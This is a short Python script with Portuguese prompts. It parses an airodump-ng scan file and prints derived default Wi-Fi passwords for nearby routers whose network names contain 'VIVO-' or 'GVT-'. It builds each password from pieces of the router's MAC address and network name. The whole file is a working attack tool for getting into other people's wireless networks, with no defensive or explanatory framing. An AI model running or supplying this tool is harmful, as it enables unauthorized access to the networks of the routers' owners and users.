import csv

print('Execute o airodump-ng -w \{name\} --output-format csv {interface}')
print('para obter o arquivo csv')

with  open(str(input('Arquivo .csv Airodump-ng: '))) as arquivoCsv:

    print('\n    Rede     Senha')

    try:
        reader = csv.reader(arquivoCsv)

        for linha in reader:

            if not linha: 
                pass
            else:

                if linha[0] == 'Station MAC': 
                    break
                else:
                    dicio = { 'BSSID':linha[0],'ESSID':linha[13] } 

                    if dicio['BSSID'] == 'BSSID': 
                        pass
                    else:
                        if 'VIVO-' in dicio['ESSID'] or 'GVT-' in dicio['ESSID']:
                            senha = dicio['BSSID'][3:-5].replace(':', '')+dicio['ESSID'][6:]

                            print(dicio['ESSID'], senha)

    finally:
        print('\n')
        arquivoCsv.close()